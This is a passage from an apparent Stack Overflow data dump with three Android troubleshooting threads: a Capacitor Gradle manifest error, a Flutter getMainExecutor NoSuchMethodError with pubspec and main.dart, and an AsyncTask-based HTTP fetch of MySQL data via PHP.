org.gradle.api.internal.tasks.execution.ResolveTaskExecutionModeExecuter.execute(ResolveTaskExecutionModeExecuter.java:51)\n    at org.gradle.api.internal.tasks.execution.SkipTaskWithNoActionsExecuter.execute(SkipTaskWithNoActionsExecuter.java:57)\n    at org.gradle.api.internal.tasks.execution.SkipOnlyIfTaskExecuter.execute(SkipOnlyIfTaskExecuter.java:56)\n    at org.gradle.api.internal.tasks.execution.CatchExceptionTaskExecuter.execute(CatchExceptionTaskExecuter.java:36)\n    at org.gradle.api.internal.tasks.execution.EventFiringTaskExecuter$1.executeTask(EventFiringTaskExecuter.java:77)\n    at org.gradle.api.internal.tasks.execution.EventFiringTaskExecuter$1.call(EventFiringTaskExecuter.java:55)\n    at org.gradle.api.internal.tasks.execution.EventFiringTaskExecuter$1.call(EventFiringTaskExecuter.java:52)\n    at org.gradle.internal.operations.DefaultBuildOperationRunner$CallableBuildOperationWorker.execute(DefaultBuildOperationRunner.java:204)\n    at org.gradle.internal.operations.DefaultBuildOperationRunner$CallableBuildOperationWorker.execute(DefaultBuildOperationRunner.java:199)\n    at org.gradle.internal.operations.DefaultBuildOperationRunner$2.execute(DefaultBuildOperationRunner.java:66)\n    at org.gradle.internal.operations.DefaultBuildOperationRunner$2.execute(DefaultBuildOperationRunner.java:59)\n    at org.gradle.internal.operations.DefaultBuildOperationRunner.execute(DefaultBuildOperationRunner.java:157)\n    at org.gradle.internal.operations.DefaultBuildOperationRunner.execute(DefaultBuildOperationRunner.java:59)\n    at org.gradle.internal.operations.DefaultBuildOperationRunner.call(DefaultBuildOperationRunner.java:53)\n    at org.gradle.internal.operations.DefaultBuildOperationExecutor.call(DefaultBuildOperationExecutor.java:73)\n    at org.gradle.api.internal.tasks.execution.EventFiringTaskExecuter.execute(EventFiringTaskExecuter.java:52)\n    at org.gradle.execution.plan.LocalTaskNodeExecutor.execute(LocalTaskNodeExecutor.java:69)\n    at org.gradle.execution.taskgraph.DefaultTaskExecutionGraph$InvokeNodeExecutorsAction.execute(DefaultTaskExecutionGraph.java:327)\n    at org.gradle.execution.taskgraph.DefaultTaskExecutionGraph$InvokeNodeExecutorsAction.execute(DefaultTaskExecutionGraph.java:314)\n    at org.gradle.execution.taskgraph.DefaultTaskExecutionGraph$BuildOperationAwareExecutionAction.execute(DefaultTaskExecutionGraph.java:307)\n    at org.gradle.execution.taskgraph.DefaultTaskExecutionGraph$BuildOperationAwareExecutionAction.execute(DefaultTaskExecutionGraph.java:293)\n    at org.gradle.execution.plan.DefaultPlanExecutor$ExecutorWorker.execute(DefaultPlanExecutor.java:417)\n    at org.gradle.execution.plan.DefaultPlanExecutor$ExecutorWorker.run(DefaultPlanExecutor.java:339)\n    at org.gradle.internal.concurrent.ExecutorPolicy$CatchAndRecordFailures.onExecute(ExecutorPolicy.java:64)\n    at org.gradle.internal.concurrent.ManagedExecutorImpl$1.run(ManagedExecutorImpl.java:48)\n\n</code></pre>\n<p><strong>build.gradle</strong></p>\n<pre><code>apply plugin: 'com.android.application'\n\nandroid {\n    compileSdkVersion rootProject.ext.compileSdkVersion\n    defaultConfig {\n        applicationId &quot;io.ionic.starter&quot;\n        minSdkVersion rootProject.ext.minSdkVersion\n        targetSdkVersion rootProject.ext.targetSdkVersion\n        versionCode 1\n        versionName &quot;1.0&quot;\n        testInstrumentationRunner &quot;androidx.test.runner.AndroidJUnitRunner&quot;\n        aaptOptions {\n             // Files and dirs to omit from the packaged assets dir, modified to accommodate modern web apps.\n             // Default: https://android.googlesource.com/platform/frameworks/base/+/282e181b58cf72b6ca770dc7ca5f91f135444502/tools/aapt/AaptAssets.cpp#61\n            ignoreAssetsPattern '!.svn:!.git:!.ds_store:!*.scc:.*:!CVS:!thumbs.db:!picasa.ini:!*~'\n        }\n    }\n    buildTypes {\n        release {\n            minifyEnabled false\n            proguardFiles getDefaultProguardFile('proguard-android.txt'), 'proguard-rules.pro'\n        }\n    }\n}\n\nrepositories {\n    flatDir{\n        dirs '../capacitor-cordova-android-plugins/src/main/libs', 'libs'\n    }\n}\n\ndependencies {\n    implementation fileTree(include: ['*.jar'], dir: 'libs')\n    implementation &quot;androidx.appcompat:appcompat:$androidxAppCompatVersion&quot;\n    implementation project(':capacitor-android')\n    testImplementation &quot;junit:junit:$junitVersion&quot;\n    androidTestImplementation &quot;androidx.test.ext:junit:$androidxJunitVersion&quot;\n    androidTestImplementation &quot;androidx.test.espresso:espresso-core:$androidxEspressoCoreVersion&quot;\n    implementation project(':capacitor-cordova-android-plugins')\n}\n\napply from: 'capacitor.build.gradle'\n\ntry {\n    def servicesJSON = file('google-services.json')\n    if (servicesJSON.text) {\n        apply plugin: 'com.google.gms.google-services'\n    }\n} catch(Exception e) {\n    logger.warn(&quot;google-services.json not found, google-services plugin not applied. Push Notifications won't work&quot;)\n}\n\n</code></pre>\n<p>My main outcome from the above stack trace is the following:</p>\n<blockquote>\n<p>Task :app:processDebugMainManifest FAILED\nExecution failed for task ':app:processDebugMainManifest'.\nUnable to make field private final java.lang.String java.io.File.path accessible: module java.base does not &quot;opens java.io&quot; to unnamed module @7735a62e</p>\n</blockquote>\n<p>I have exhausted every option trying to figure out a solution.</p>\n<p>Anyone know or seen these issues before?</p>\n"},{"tags":["java","android","flutter","android-studio","dart"],"comments":[{"owner":{"account_id":26107360,"reputation":792,"user_id":19801869,"display_name":"Georgina"},"score":1,"creation_date":1670557202,"post_id":74737333,"comment_id":131907037,"body_markdown":"Did you use the Flutter Splash screen package?","body":"Did you use the Flutter Splash screen package?"},{"owner":{"account_id":26054611,"reputation":335,"user_id":19757192,"display_name":"Praveesh Ramroop"},"score":0,"creation_date":1670679563,"post_id":74737333,"comment_id":131931535,"body_markdown":"Yes, I did use the Splash screen package.","body":"Yes, I did use the Splash screen package."},{"owner":{"account_id":26107360,"reputation":792,"user_id":19801869,"display_name":"Georgina"},"score":1,"creation_date":1670687461,"post_id":74737333,"comment_id":131933084,"body_markdown":"Could you include your pubcpec.yaml file","body":"Could you include your pubcpec.yaml file"},{"owner":{"account_id":26107360,"reputation":792,"user_id":19801869,"display_name":"Georgina"},"score":1,"creation_date":1670687623,"post_id":74737333,"comment_id":131933126,"body_markdown":"also include your main.dart page (Your main function)","body":"also include your main.dart page (Your main function)"},{"owner":{"account_id":26054611,"reputation":335,"user_id":19757192,"display_name":"Praveesh Ramroop"},"score":0,"creation_date":1670689238,"post_id":74737333,"comment_id":131933463,"body_markdown":"I added the pubcpec.yaml file and the main.dart page.","body":"I added the pubcpec.yaml file and the main.dart page."},{"owner":{"account_id":26107360,"reputation":792,"user_id":19801869,"display_name":"Georgina"},"score":1,"creation_date":1670697653,"post_id":74737333,"comment_id":131935235,"body_markdown":"I would recommend this package: https://pub.dev/packages/flutter_native_splash. Please before use make sure to remove any previous splash screen setup. Follow this youtube tutorial: https://www.youtube.com/watch?v=dB0dOnc2k10","body":"I would recommend this package: <a href=\"https://pub.dev/packages/flutter_native_splash\" rel=\"nofollow noreferrer\">pub.dev/packages/flutter_native_splash</a>. Please before use make sure to remove any previous splash screen setup. Follow this youtube tutorial: <a href=\"https://www.youtube.com/watch?v=dB0dOnc2k10\" rel=\"nofollow noreferrer\">youtube.com/watch?v=dB0dOnc2k10</a>"},{"owner":{"account_id":26054611,"reputation":335,"user_id":19757192,"display_name":"Praveesh Ramroop"},"score":0,"creation_date":1670715025,"post_id":74737333,"comment_id":131938170,"body_markdown":"Thank you, Georgina, for helping. Unfortunately, that didn&#39;t solve the issue. Is there anything else I can do to solve it?","body":"Thank you, Georgina, for helping. Unfortunately, that didn&#39;t solve the issue. Is there anything else I can do to solve it?"},{"owner":{"account_id":26054611,"reputation":335,"user_id":19757192,"display_name":"Praveesh Ramroop"},"score":0,"creation_date":1670724058,"post_id":74737333,"comment_id":131939148,"body_markdown":"Thank you, Georgina, for helping. Unfortunately, that didn&#39;t solve the issue. Is there anything else I can do to solve it?","body":"Thank you, Georgina, for helping. Unfortunately, that didn&#39;t solve the issue. Is there anything else I can do to solve it?"}],"answers":[{"tags":[],"owner":{"account_id":19001594,"reputation":31,"user_id":13868936,"display_name":"UJJAWAL KUMAR"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1683726037,"creation_date":1683726037,"answer_id":76219153,"question_id":74737333,"body_markdown":"Use this it will help in Kotlin\r\n\r\n     val context= LocalContext.current\r\n     ContextCompat.getMainExecutor(context)\r\n\r\nor \r\n\r\n     ContextCompat.getMainExecutor(this)","title":"Why do I have the following error: java.lang.NoSuchMethodError: No static method getMainExecutor(Landroid/content/Context;)","body":"<p>Use this it will help in Kotlin</p>\n<pre><code> val context= LocalContext.current\n ContextCompat.getMainExecutor(context)\n</code></pre>\n<p>or</p>\n<pre><code> ContextCompat.getMainExecutor(this)\n</code></pre>\n"}],"owner":{"account_id":26054611,"reputation":335,"user_id":19757192,"display_name":"Praveesh Ramroop"},"comment_count":8,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":455,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":1,"score":1,"last_activity_date":1683726037,"creation_date":1670541124,"question_id":74737333,"body_markdown":"I tried running my Flutter application on the android emulator, but it won&#39;t because of the following error:\r\n\r\n\r\n    Running Gradle task &#39;assembleDebug&#39;...                             60.6s\r\n    √  Built build\\app\\outputs\\flutter-apk\\app-debug.apk.\r\n    Installing ..\\build\\app\\outputs\\flutter-apk\\app.apk...             36.2s\r\n    W/FlutterActivityAndFragmentDelegate(11217): A splash screen was provided to Flutter, but this is deprecated. See flutter.dev/go/android-splash-migration for migration steps.\r\n    D/FlutterLocationService(11217): Creating service.\r\n    D/FlutterLocationService(11217): Binding to location service.\r\n    E/AndroidRuntime(11217): FATAL EXCEPTION: main\r\n    E/AndroidRuntime(11217): Process: com.praveeshramroop.athena, PID: 11217\r\n    E/AndroidRuntime(11217): java.lang.NoSuchMethodError: No static method getMainExecutor(Landroid/content/Context;)Ljava/util/concurrent/Executor; in class Landroidx/core/content/ContextCompat; or its super classes (declaration of &#39;androidx.core.content.ContextCompat&#39; appears in /data/app/com.praveeshramroop.athena-xNhfD9FuVpNs2XnASDlC4w==/base.apk)\r\n    E/AndroidRuntime(11217):        at io.flutter.embedding.android.FlutterView.onAttachedToWindow(FlutterView.java:506)\r\n    E/AndroidRuntime(11217):        at android.view.View.dispatchAttachedToWindow(View.java:18347)\r\n    E/AndroidRuntime(11217):        at android.view.ViewGroup.dispatchAttachedToWindow(ViewGroup.java:3397)\r\n    E/AndroidRuntime(11217):        at android.view.ViewGroup.dispatchAttachedToWindow(ViewGroup.java:3404)\r\n    E/AndroidRuntime(11217):        at android.view.ViewGroup.dispatchAttachedToWindow(ViewGroup.java:3404)\r\n    E/AndroidRuntime(11217):        at android.view.ViewGroup.dispatchAttachedToWindow(ViewGroup.java:3404)\r\n    E/AndroidRuntime(11217):        at android.view.ViewGroup.dispatchAttachedToWindow(ViewGroup.java:3404)\r\n    E/AndroidRuntime(11217):        at android.view.ViewRootImpl.performTraversals(ViewRootImpl.java:1761)\r\n    E/AndroidRuntime(11217):        at android.view.ViewRootImpl.doTraversal(ViewRootImpl.java:1460)\r\n    E/AndroidRuntime(11217):        at android.view.ViewRootImpl$TraversalRunnable.run(ViewRootImpl.java:7183)\r\n    E/AndroidRuntime(11217):        at android.view.Choreographer$CallbackRecord.run(Choreographer.java:949)\r\n    E/AndroidRuntime(11217):        at android.view.Choreographer.doCallbacks(Choreographer.java:761)\r\n    E/AndroidRuntime(11217):        at android.view.Choreographer.doFrame(Choreographer.java:696)\r\n    E/AndroidRuntime(11217):        at android.view.Choreographer$FrameDisplayEventReceiver.run(Choreographer.java:935)\r\n    E/AndroidRuntime(11217):        at android.os.Handler.handleCallback(Handler.java:873)\r\n    E/AndroidRuntime(11217):        at android.os.Handler.dispatchMessage(Handler.java:99)\r\n    E/AndroidRuntime(11217):        at android.os.Looper.loop(Looper.java:193)\r\n    E/AndroidRuntime(11217):        at android.app.ActivityThread.main(ActivityThread.java:6669)\r\n    E/AndroidRuntime(11217):        at java.lang.reflect.Method.invoke(Native Method)\r\n    E/AndroidRuntime(11217):        at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:493)\r\n    E/AndroidRuntime(11217):        at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:858)\r\n\r\n\r\n\r\n**Other times the errors simply say**:\r\n\r\n - Lost connection to device \r\n - Error connecting to service protocol\r\n\r\n\r\n**pubcpec.yaml file**:\r\n\r\n    \r\n    dependencies:\r\n      flutter:\r\n        sdk: flutter\r\n      cloud_firestore: \r\n      cupertino_icons: null\r\n      firebase_auth: \r\n      firebase_core: \r\n      firebase_messaging: \r\n      flutter_google_places: null\r\n      flutter_spinkit: ^5.1.0\r\n      geocoder: \r\n      geoflutterfire: \r\n      geolocator: \r\n      google_maps_flutter: null\r\n      google_maps_webservice: null\r\n      http: null\r\n      location: ^4.4.0\r\n      modal_bottom_sheet: ^2.0.1\r\n      percent_indicator: ^4.2.1\r\n      provider: null\r\n      rxdart: any\r\n      shared_preferences: ^2.0.15\r\n      uuid: null\r\n      url_launcher: ^6.0.5\r\n      get_it: ^7.2.0\r\n      plugin_platform_interface: \r\n      geolocator_platform_interface: \r\n      geocoding: ^2.0.4\r\n      google_api_availability:\r\n      google_api_headers: ^1.1.1\r\n      mockito: ^5.2.0\r\n      \r\n\r\n\r\n**main.dart** page:\r\n\r\n    import &#39;package:flutter/material.dart&#39;;\r\n    import &#39;package:txapita/providers/app_state.dart&#39;;\r\n    import &#39;package:txapita/providers/user.dart&#39;;\r\n    import &#39;package:txapita/screens/login.dart&#39;;\r\n    import &#39;package:txapita/screens/splash.dart&#39;;\r\n    import &#39;locators/service_locator.dart&#39;;\r\n    import &#39;screens/home.dart&#39;;\r\n    import &#39;package:provider/provider.dart&#39;;\r\n    import &#39;package:firebase_core/firebase_core.dart&#39;;\r\n    \r\n    void main() async {\r\n      WidgetsFlutterBinding.ensureInitialized();\r\n      await Firebase.initializeApp();\r\n      setupLocator();\r\n      return runApp(MultiProvider(\r\n        providers: [\r\n          ChangeNotifierProvider&lt;AppStateProvider&gt;.value(\r\n            value: AppStateProvider(),\r\n          ),\r\n          ChangeNotifierProvider&lt;UserProvider&gt;.value(\r\n            value: UserProvider.initialize(),\r\n          ),\r\n        ],\r\n        child: MaterialApp(\r\n          debugShowCheckedModeBanner: false,\r\n          title: &#39;Txapita&#39;,\r\n          theme: ThemeData(\r\n            primarySwatch: Colors.red,\r\n          ),\r\n          home: MyApp(),\r\n        ),\r\n      ));\r\n    }\r\n    \r\n    class MyApp extends StatelessWidget {\r\n      @override\r\n      Widget build(BuildContext context) {\r\n        UserProvider auth = Provider.of&lt;UserProvider&gt;(context);\r\n        switch (auth.status) {\r\n          case Status.Uninitialized:\r\n            return Splash();\r\n          case Status.Unauthenticated:\r\n          case Status.Authenticating:\r\n            return LoginScreen();\r\n          case Status.Authenticated:\r\n            return MyHomePage();\r\n          default:\r\n            return LoginScreen();\r\n        }\r\n      }\r\n    }\r\n    \r\n          \r\n\r\nI have no idea what&#39;s causing this issue or how to solve it. Anyone know how to solve this?\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n","title":"Why do I have the following error: java.lang.NoSuchMethodError: No static method getMainExecutor(Landroid/content/Context;)","body":"<p>I tried running my Flutter application on the android emulator, but it won't because of the following error:</p>\n<pre><code>Running Gradle task 'assembleDebug'...                             60.6s\n√  Built build\\app\\outputs\\flutter-apk\\app-debug.apk.\nInstalling ..\\build\\app\\outputs\\flutter-apk\\app.apk...             36.2s\nW/FlutterActivityAndFragmentDelegate(11217): A splash screen was provided to Flutter, but this is deprecated. See flutter.dev/go/android-splash-migration for migration steps.\nD/FlutterLocationService(11217): Creating service.\nD/FlutterLocationService(11217): Binding to location service.\nE/AndroidRuntime(11217): FATAL EXCEPTION: main\nE/AndroidRuntime(11217): Process: com.praveeshramroop.athena, PID: 11217\nE/AndroidRuntime(11217): java.lang.NoSuchMethodError: No static method getMainExecutor(Landroid/content/Context;)Ljava/util/concurrent/Executor; in class Landroidx/core/content/ContextCompat; or its super classes (declaration of 'androidx.core.content.ContextCompat' appears in /data/app/com.praveeshramroop.athena-xNhfD9FuVpNs2XnASDlC4w==/base.apk)\nE/AndroidRuntime(11217):        at io.flutter.embedding.android.FlutterView.onAttachedToWindow(FlutterView.java:506)\nE/AndroidRuntime(11217):        at android.view.View.dispatchAttachedToWindow(View.java:18347)\nE/AndroidRuntime(11217):        at android.view.ViewGroup.dispatchAttachedToWindow(ViewGroup.java:3397)\nE/AndroidRuntime(11217):        at android.view.ViewGroup.dispatchAttachedToWindow(ViewGroup.java:3404)\nE/AndroidRuntime(11217):        at android.view.ViewGroup.dispatchAttachedToWindow(ViewGroup.java:3404)\nE/AndroidRuntime(11217):        at android.view.ViewGroup.dispatchAttachedToWindow(ViewGroup.java:3404)\nE/AndroidRuntime(11217):        at android.view.ViewGroup.dispatchAttachedToWindow(ViewGroup.java:3404)\nE/AndroidRuntime(11217):        at android.view.ViewRootImpl.performTraversals(ViewRootImpl.java:1761)\nE/AndroidRuntime(11217):        at android.view.ViewRootImpl.doTraversal(ViewRootImpl.java:1460)\nE/AndroidRuntime(11217):        at android.view.ViewRootImpl$TraversalRunnable.run(ViewRootImpl.java:7183)\nE/AndroidRuntime(11217):        at android.view.Choreographer$CallbackRecord.run(Choreographer.java:949)\nE/AndroidRuntime(11217):        at android.view.Choreographer.doCallbacks(Choreographer.java:761)\nE/AndroidRuntime(11217):        at android.view.Choreographer.doFrame(Choreographer.java:696)\nE/AndroidRuntime(11217):        at android.view.Choreographer$FrameDisplayEventReceiver.run(Choreographer.java:935)\nE/AndroidRuntime(11217):        at android.os.Handler.handleCallback(Handler.java:873)\nE/AndroidRuntime(11217):        at android.os.Handler.dispatchMessage(Handler.java:99)\nE/AndroidRuntime(11217):        at android.os.Looper.loop(Looper.java:193)\nE/AndroidRuntime(11217):        at android.app.ActivityThread.main(ActivityThread.java:6669)\nE/AndroidRuntime(11217):        at java.lang.reflect.Method.invoke(Native Method)\nE/AndroidRuntime(11217):        at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:493)\nE/AndroidRuntime(11217):        at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:858)\n</code></pre>\n<p><strong>Other times the errors simply say</strong>:</p>\n<ul>\n<li>Lost connection to device</li>\n<li>Error connecting to service protocol</li>\n</ul>\n<p><strong>pubcpec.yaml file</strong>:</p>\n<pre><code>dependencies:\n  flutter:\n    sdk: flutter\n  cloud_firestore: \n  cupertino_icons: null\n  firebase_auth: \n  firebase_core: \n  firebase_messaging: \n  flutter_google_places: null\n  flutter_spinkit: ^5.1.0\n  geocoder: \n  geoflutterfire: \n  geolocator: \n  google_maps_flutter: null\n  google_maps_webservice: null\n  http: null\n  location: ^4.4.0\n  modal_bottom_sheet: ^2.0.1\n  percent_indicator: ^4.2.1\n  provider: null\n  rxdart: any\n  shared_preferences: ^2.0.15\n  uuid: null\n  url_launcher: ^6.0.5\n  get_it: ^7.2.0\n  plugin_platform_interface: \n  geolocator_platform_interface: \n  geocoding: ^2.0.4\n  google_api_availability:\n  google_api_headers: ^1.1.1\n  mockito: ^5.2.0\n  \n</code></pre>\n<p><strong>main.dart</strong> page:</p>\n<pre><code>import 'package:flutter/material.dart';\nimport 'package:txapita/providers/app_state.dart';\nimport 'package:txapita/providers/user.dart';\nimport 'package:txapita/screens/login.dart';\nimport 'package:txapita/screens/splash.dart';\nimport 'locators/service_locator.dart';\nimport 'screens/home.dart';\nimport 'package:provider/provider.dart';\nimport 'package:firebase_core/firebase_core.dart';\n\nvoid main() async {\n  WidgetsFlutterBinding.ensureInitialized();\n  await Firebase.initializeApp();\n  setupLocator();\n  return runApp(MultiProvider(\n    providers: [\n      ChangeNotifierProvider&lt;AppStateProvider&gt;.value(\n        value: AppStateProvider(),\n      ),\n      ChangeNotifierProvider&lt;UserProvider&gt;.value(\n        value: UserProvider.initialize(),\n      ),\n    ],\n    child: MaterialApp(\n      debugShowCheckedModeBanner: false,\n      title: 'Txapita',\n      theme: ThemeData(\n        primarySwatch: Colors.red,\n      ),\n      home: MyApp(),\n    ),\n  ));\n}\n\nclass MyApp extends StatelessWidget {\n  @override\n  Widget build(BuildContext context) {\n    UserProvider auth = Provider.of&lt;UserProvider&gt;(context);\n    switch (auth.status) {\n      case Status.Uninitialized:\n        return Splash();\n      case Status.Unauthenticated:\n      case Status.Authenticating:\n        return LoginScreen();\n      case Status.Authenticated:\n        return MyHomePage();\n      default:\n        return LoginScreen();\n    }\n  }\n}\n\n      \n</code></pre>\n<p>I have no idea what's causing this issue or how to solve it. Anyone know how to solve this?</p>\n"},{"tags":["java","php","android","mysql"],"comments":[{"owner":{"account_id":1139827,"reputation":675,"user_id":1124058,"accept_rate":58,"display_name":"Antarix"},"score":0,"creation_date":1351088569,"post_id":13050072,"comment_id":17722542,"body_markdown":"Did you checked your internet is working in your emulator ?","body":"Did you checked your internet is working in your emulator ?"},{"owner":{"account_id":1971700,"reputation":19,"user_id":1770450,"accept_rate":50,"display_name":"Fcbrasov Romania"},"score":0,"creation_date":1351140795,"post_id":13050072,"comment_id":17740246,"body_markdown":"Hi Antarix, yes, the internet connection is working fine in emulator.","body":"Hi Antarix, yes, the internet connection is working fine in emulator."}],"answers":[{"tags":[],"owner":{"account_id":21470,"reputation":45897,"user_id":52201,"accept_rate":100,"display_name":"cjk"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1351084812,"creation_date":1351084812,"answer_id":13050117,"question_id":13050072,"body_markdown":"The problem is this:\r\n\r\n    10-24 13:04:34.859: E/log_tag(982): Error in http connection: \r\n                        android.os.NetworkOnMainThreadException \r\n\r\nYou need to do your network access on a different thread.","title":"Android connecting to mysql through php","body":"<p>The problem is this:</p>\n\n<pre><code>10-24 13:04:34.859: E/log_tag(982): Error in http connection: \n                    android.os.NetworkOnMainThreadException \n</code></pre>\n\n<p>You need to do your network access on a different thread.</p>\n"},{"tags":[],"owner":{"account_id":1842880,"reputation":3139,"user_id":1671933,"accept_rate":77,"display_name":"kabuto178"},"down_vote_count":0,"up_vote_count":0,"is_accepted":true,"score":0,"last_activity_date":1351087186,"creation_date":1351087186,"answer_id":13050840,"question_id":13050072,"body_markdown":"You may use an AsyncTask class to carry out your network operations as strictmode does not allow it to be done on the main UI example as follows   \r\n\r\n\r\n              public class MainActivity extends Activity {\r\n\r\n             JSONArray jArray;\r\n             String result = null;\r\n             InputStream is = null;\r\n              StringBuilder sb=null;\r\n\r\n             @Override\r\n            public void onCreate(Bundle savedInstanceState) {\r\n\r\n\r\n            super.onCreate(savedInstanceState);\r\n            setContentView(R.layout.activity_main);\r\n\r\n           new httpRequest().execute();\r\n\r\n            }\r\n\r\n\r\n             private class httprRequest extends AsyncTask&lt;String, Integer, String&gt;{\r\n                          \r\n                    @override\r\n                    public String doInBackground(String.... params){\r\n                       ArrayList&lt;NameValuePair&gt; nameValuePairs = new             ArrayList&lt;NameValuePair&gt;();\r\n            //http post\r\n              try{\r\n               HttpClient httpclient = new DefaultHttpClient();\r\n               HttpPost httppost = new HttpPost(&quot;http://www.steagu.ro/android/city.php&quot;);\r\n               httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));\r\n               HttpResponse response = httpclient.execute(httppost);\r\n               if (response.getStatusLine().getStatusCode() != 200) {\r\n                   Log.d(&quot;MyApp&quot;, &quot;Server encountered an error.&quot;);\r\n\r\n                  }\r\n              HttpEntity entity = response.getEntity();\r\n              is = entity.getContent();\r\n              }catch(Exception e){\r\n              //e.printStackTrace();\r\n              Log.e(&quot;log_tag&quot;, &quot;Error in http connection: &quot;+e.toString());\r\n               }\r\n\r\n                    }\r\n                  }\r\n\r\n               }\r\n           }","title":"Android connecting to mysql through php","body":"<p>You may use an AsyncTask class to carry out your network operations as strictmode does not allow it to be done on the main UI example as follows   </p>\n\n<pre><code>          public class MainActivity extends Activity {\n\n         JSONArray jArray;\n         String result = null;\n         InputStream is = null;\n          StringBuilder sb=null;\n\n         @Override\n        public void onCreate(Bundle savedInstanceState) {\n\n\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n       new httpRequest().execute();\n\n        }\n\n\n         private class httprRequest extends AsyncTask&lt;String, Integer, String&gt;{\n\n                @override\n                public String doInBackground(String.... params){\n                   ArrayList&lt;NameValuePair&gt; nameValuePairs = new             ArrayList&lt;NameValuePair&gt;();\n        //http post\n          try{\n           HttpClient httpclient = new DefaultHttpClient();\n           HttpPost httppost = new HttpPost(\"http://www.steagu.ro/android/city.php\");\n           httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));\n           HttpResponse response = httpclient.execute(httppost);\n           if (response.getStatusLine().getStatusCode() != 200) {\n               Log.d(\"MyApp\", \"Server encountered an error.\");\n\n              }\n          HttpEntity entity = response.getEntity();\n          is = entity.getContent();\n          }catch(Exception e){\n          //e.printStackTrace();\n          Log.e(\"log_tag\", \"Error in http connection: \"+e.toString());\n           }\n\n                }\n              }\n\n           }\n       }\n</code></pre>\n"},{"tags":[],"owner":{"account_id":1971700,"reputation":19,"user_id":1770450,"accept_rate":50,"display_name":"Fcbrasov Romania"},"down_vote_count":1,"up_vote_count":0,"is_accepted":false,"score":-1,"last_activity_date":1351165159,"creation_date":1351150675,"answer_id":13063781,"question_id":13050072,"body_markdown":"Thank you kabuto178, I&#39;m made the changes and it&#39;s connecting. I&#39;ve wrote the code also for retrieving data from mysql, so who need this, can use my example\r\n\r\nHere is the code:\r\n\r\n    package com.example.mycity;\r\n    \r\n    \r\n    import android.os.AsyncTask;\r\n    import android.os.Bundle;\r\n    import android.app.Activity;\r\n    \r\n    \r\n    import java.io.BufferedReader;\r\n    import java.io.InputStream;\r\n    import java.io.InputStreamReader;\r\n    import java.util.ArrayList;\r\n    \r\n    import org.apache.http.HttpEntity;\r\n    import org.apache.http.HttpResponse;\r\n    import org.apache.http.NameValuePair;\r\n    import org.apache.http.client.HttpClient;\r\n    import org.apache.http.client.entity.UrlEncodedFormEntity;\r\n    import org.apache.http.client.methods.HttpPost;\r\n    import org.apache.http.impl.client.DefaultHttpClient;\r\n    import org.json.JSONArray;\r\n    import org.json.JSONException;\r\n    import org.json.JSONObject;\r\n    \r\n    import android.net.ParseException;\r\n    import android.util.Log;\r\n    import android.widget.TextView;\r\n    import android.widget.Toast;\r\n    \r\n    public class MainActivity extends Activity {\r\n    \r\n    String result = &quot;&quot;;\r\n    InputStream is = null;\r\n    StringBuilder sb=null;\r\n    //String ct_name = null;\r\n    \r\n    @Override\r\n    public void onCreate(Bundle savedInstanceState) {\r\n    \r\n    \t\r\n    super.onCreate(savedInstanceState);\r\n    setContentView(R.layout.activity_main);\r\n    new httprRequest().execute();\r\n    \r\n    \r\n    int ct_id=0;\r\n    String ct_name=&quot;&quot;;\r\n    \r\n    //Toast.makeText(getBaseContext(), &quot;This is &quot;+result, 3000).show();\r\n    \r\n    try {\r\n    Thread.sleep(1000L);\r\n    } catch (Exception te) {}\r\n    \r\n    try{\r\n        //ct_name = result;\r\n    \tJSONArray jArray = new JSONArray(result);\r\n    \r\n        for(int i=0;i&lt;jArray.length();i++){\r\n               JSONObject json_data= jArray.getJSONObject(i);\r\n               ct_id=json_data.getInt(&quot;CITY_ID&quot;);\r\n               ct_name += json_data.getString(&quot;CITY_NAME&quot;)+&quot;:&quot;;\r\n           }\r\n       \r\n        }\r\n        catch(JSONException e1){\r\n      \t  e1.printStackTrace();\r\n        } catch (ParseException e1) {\r\n    \t\t\te1.printStackTrace();\r\n    \t}\r\n     \r\n    TextView tv1 = (TextView) findViewById(R.id.textView1);\r\n    tv1.setText(ct_name);\r\n    \r\n    }\r\n    \r\n    private class httprRequest extends AsyncTask&lt;String, Integer, String&gt;{\r\n    \r\n        @Override \r\n        public String doInBackground(String... params){\r\n    ArrayList&lt;NameValuePair&gt; nameValuePairs = new ArrayList&lt;NameValuePair&gt;();\r\n    //http post\r\n    try{\r\n    HttpClient httpclient = new DefaultHttpClient();\r\n    HttpPost httppost = new HttpPost(&quot;http://www.steagu.ro/android/city.php&quot;);\r\n    httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));\r\n    HttpResponse response = httpclient.execute(httppost);\r\n    if (response.getStatusLine().getStatusCode() != 200) {\r\n       Log.d(&quot;MyApp&quot;, &quot;Server encountered an error.&quot;);\r\n    \r\n      }\r\n    HttpEntity entity = response.getEntity();\r\n    is = entity.getContent();\r\n    }catch(Exception e){\r\n    //e.printStackTrace();\r\n    Log.e(&quot;log_tag&quot;, &quot;Error in http connection: &quot;+e.toString());\r\n    }\r\n    \r\n    //convert response to string\r\n    \r\n    try{\r\n          BufferedReader reader = new BufferedReader(new InputStreamReader(is,&quot;iso-8859-1&quot;),8);\r\n           sb = new StringBuilder();\r\n           sb.append(reader.readLine() + &quot;\\n&quot;);\r\n    \r\n           String line=&quot;0&quot;;\r\n           while ((line = reader.readLine()) != null) {\r\n                          sb.append(line + &quot;\\n&quot;);\r\n            }\r\n            is.close();\r\n            result=sb.toString();\r\n    }catch(Exception e){\r\n       \t    //Toast.makeText(getBaseContext(), &quot;Am eroare aici&quot;, 3000).show();\r\n            Log.e(&quot;log_tag&quot;, &quot;Error converting result &quot;+e.toString());\r\n    }\r\n    \r\n    \r\n    /*\r\n    Toast.makeText(getBaseContext(), &quot;Here i am&quot;, 3000).show();\r\n    */\r\n    \r\n    return result;\r\n        }\r\n    \r\n      }\r\n    \r\n    }\r\n\r\nI have to change a little bit the code, cause i put a thread.sleep. Instead of it, i have to check if i have a value into result (in 